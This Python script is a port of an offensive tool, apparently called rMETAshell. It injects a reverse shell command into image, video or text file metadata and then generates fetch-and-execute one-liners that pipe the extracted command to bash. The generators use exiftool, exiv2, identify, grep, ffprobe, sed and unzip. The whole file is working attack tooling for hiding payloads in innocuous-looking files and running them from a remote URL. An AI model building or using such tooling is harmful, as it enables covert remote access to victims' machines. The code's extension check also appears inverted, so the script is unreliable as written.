###
### PORT DONE
### Start: 19/11/2023
### End: 19/11/2023

### Main program's credits:
# Ver. Sat/Sept/30/2023
#-------------------------------------------------
#
# From: LoxoSec with ❤️
#
# rMETAshell - A reverse shell metadata injection
# and one-liner generator tool!
#
# git5
# ------------------------------------------------
# Github
# https://github.com/git5loxosec
# ------------------------------------------------
# Website
# https://www.LoxoSec.rf.gd
# ------------------------------------------------
# Whatsapp group (Latin/Hispanic/International)
# https://chat.whatsapp.com/Iv7lplJVgM16FeuIzKhFxj
# ------------------------------------------------
# X
# https://x.com/git5loxosec
# ------------------------------------------------
# Facebook
# https://www.facebook.com/profile.php?id=61551530174528
# ------------------------------------------------

### Port's credits:
# Ver. Sun/19/Nov/2023
# From CyberCoral
# :D
# ------------------------------------------------
# Github
# https://github.com/CyberCoral
# ------------------------------------------------


import os, re, subprocess
    
import exiftool
from colorama import Fore, Back, Style, init

init()

#
# Improve for better compatibility
#

def shell(args: str):
    a = args.replace(" ","¡").split("¡")
    a0 = []
    string = []
    print(a)
    while len(a) >= 1:
        a0.append(a[0])
        
        if a[0].count("'") == 1 or a[0].count('"') == 1:
            string.append(len(a0))
            
        if len(string) == 2:
            a0[string[0]-1] = " ".join([a0[i].replace("'","").replace('"',"") for i in range(string[0]-1, string[1])])
            for i in range(string[1]-string[0]):
                a0.pop()
                
            string.clear()
            
        del a[0]

    for i in range(len(a0)):
        print(a0[i])
    
    return main(a0)

def main(*args):

    def show_help():
        print( Fore.CYAN+"Usage: [OPTIONS] <REVERSE_SHELL_COMMAND> <filename> <URL>"+Style.RESET_ALL)
        print( Fore.CYAN+"Inject a reverse shell command into a file, generate a one-liner execution method, and upload the file."+Style.RESET_ALL)
        print( "")
        print( Fore.CYAN+"Options:"+Style.RESET_ALL)
        print( "  -h, --help           Display this help message.")
        print( "")
        print( Fore.CYAN+"Arguments:"+Style.RESET_ALL)
        print( Fore.CYAN+"<REVERSE_SHELL_COMMAND> The reverse shell command to inject."+Style.RESET_ALL)
        print( Fore.CYAN+"  <filename>            The name of the file."+Style.RESET_ALL)
        print( Fore.CYAN+"  <URL>                 The URL path to upload the file (e.g., http://www.example.com)."+Style.RESET_ALL)
        print("")

    def contains_element(element, lists):
        lists = (lambda l: list(l) if isinstance(l, list) != True else l)(lists)
        for item in lists:
            if element == item:
                return 0  
        return 1

    media_compat_file="db/media_compatibility.txt"
    text_compat_file="db/text_compatibility.txt"

    if os.path.isfile(media_compat_file):
        with open(media_compat_file,"r") as f:
            media_compatibility= f.read()
    else:
        print(Fore.LIGHTRED_EX+f"Error: Media compatibility file '{media_compat_file}' not found."+Style.RESET_ALL)
        exit(1)

    if os.path.isfile(text_compat_file):
        with open(text_compat_file,"r") as f:
            text_compatibility= f.read()
    else:
        print(Fore.LIGHTRED_EX+f"Error: Text compatibility file '{text_compat_file}' not found."+Style.RESET_ALL)
        exit(1)

    if str(args[0]) == "-h" or  str(args[0]) == "--help":
        show_help()
        exit(0)

    if len(args) != 3:
        print(Fore.LIGHTRED_EX+"Error: Invalid number of arguments."+Style.RESET_ALL)
        show_help()
        exit(1)

    command=args[0]
    filename=args[1]
    url=args[2]
    file_extension=filename[re.search(".*\.",filename).end():len(filename)]

    if contains_element(file_extension,media_compatibility):
        print(Fore.LIGHTMAGENTA_EX+"Injecting reverse shell into media file..."+Style.RESET_ALL)
        with exiftool.ExifTool() as et:
            et.execute('-Comment ='+f'{command}',f"{filename}")

        print(Fore.LIGHTMAGENTA_EX+"Media file command injection method completed."+Style.RESET_ALL)
    elif contains_element(file_extension, text_compatibility):
        print(Fore.LIGHTMAGENTA_EX+"Injecting reverse shell into text file..."+Style.RESET_ALL)
        with open(filename,"w") as f:
            f.write(f"<rs>{command}</rs>")
            f.close()
        print(Fore.LIGHTMAGENTA_EX+"Text-based file command injection method completed."+Style.RESET_ALL)
    else:
        allowed_extensions=("zip","rar")  

        if contains_element(file_extension, allowed_extensions):
            print(Fore.CYAN+f"Warning: The file extension '{file_extension}' is not in the compatibility lists but is allowed."+Style.RESET_ALL)
        else:
            print( Fore.LIGHTRED_EX+"Error: File extension not supported."+Style.RESET_ALL)
            show_help()
            exit(1)

    print(Fore.CYAN+"Select a one-liner method:"+Style.RESET_ALL)
    print(Fore.CYAN+"Execution methods compatible with image file format:"+Style.RESET_ALL)
    print( "1. image-exiftool-one-liner")
    print( "2. image-exiv2-one-liner")
    print( "3. image-identify-one-liner")
    print( "4. image-file-grep-one-liner")

    print( Fore.CYAN+"Execution methods compatible with video file format:"+Style.RESET_ALL)
    print( "5. video-exiftool-one-liner")
    print( "6. video-ffprobe-one-liner")

    print( Fore.CYAN+"Execution methods compatible with text file format:"+Style.RESET_ALL)
    print( "7. text-sed-one-liner")
    print( Fore.CYAN+"Execution method for an infected image/video saved in a zip:"+Style.RESET_ALL)
    print( "8. image/video-exiftool-zip-one-liner")

            
    method_choice = input("Enter the method number (1-8): ")
    try:
        method_choice = int(method_choice)
        method_choice = str(method_choice)
    except ValueError:
        pass

    match method_choice:
        case "1":
            print(Fore.WHITE+"Generating one-liner method with exiftool...")
            one_liner=f"curl -s '{url}/{filename}' | exiftool -Comment -b - | bash"
            print("Generated one-liner:\n"+Fore.GREEN+f"{one_liner}"+Style.RESET_ALL)
            
        case "2":
            print(Fore.WHITE+"Generating one-liner method with exiv2...")
            one_liner=f"curl -s '{url}/{filename}' -o {filename} | exiv2 -p c {filename} | bash"
            print("Generated one-liner:\n"+Fore.GREEN+f"{one_liner}"+Style.RESET_ALL)
            
        case "3":
            print(Fore.WHITE+"Generating one-liner method with identify...")
            one_liner=f"curl -s '{url}/{filename}' | identify -format '%c' - | bash"
            print("Generated one-liner:\n"+Fore.GREEN+f"{one_liner}"+Style.RESET_ALL)
            
        case "4":
            print(Fore.WHITE+"Generating one-liner method with file and grep...")
            one_liner=f"""curl -s '{url}/{filename}' | file - | grep -oP 'comment: '\K[^"]*' | bash"""
            print("Generated one-liner:\n"+Fore.GREEN+f"{one_liner}"+Style.RESET_ALL)
            
        case "5":
            print(Fore.WHITE+"Generating one-liner method with exiftool...")
            one_liner=f"curl -s '{url}/{filename}' | exiftool -Comment -b - | bash"
            print("Generated one-liner:\n"+Fore.GREEN+f"{one_liner}"+Style.RESET_ALL)
            
        case "6":
            print(Fore.WHITE+"Generating one-liner method with ffprobe...")
            one_liner=f"curl -s '{url}/{filename}' -o {filename} | ffprobe {filename} -v error -show_entries format_tags=comment -of default=nw=1:nk=1 | bash"
            print("Generated one-liner:\n"+Fore.GREEN+f"{one_liner}"+Style.RESET_ALL)
            
        case "7":
            print(Fore.WHITE+"Generating one-liner method with sed for text based files...")
            one_liner=f"curl -s '{url}/{filename}' | sed 's#<rs>##g' | sed 's#</rs>##' | bash"
            print("Generated one-liner:\n"+Fore.GREEN+f"{one_liner}"+Style.RESET_ALL)
        
        case "8":
            print(Fore.WHITE+"Generating one-liner method with exiftool for extracting the reverse shell injected on the image/video file...")
            filename2 = input("Enter the name of the file inside the ZIP archive: ")
            one_liner=f"curl -s '{url}/{filename}' -o {filename} && unzip -p {filename} {filename2} > {filename2} && exiftool -Comment -b {filename2} | bash && rm {filename2}"
            print("Generated one-liner:\n"+Fore.GREEN+f"{one_liner}"+Style.RESET_ALL)

        case _:
            print(Fore.LIGHTRED_EX+"Error: Invalid method number."+Style.RESET_ALL)
            exit(1)

    print(Fore.WHITE+"One-liner method execution completed."+Style.RESET_ALL)

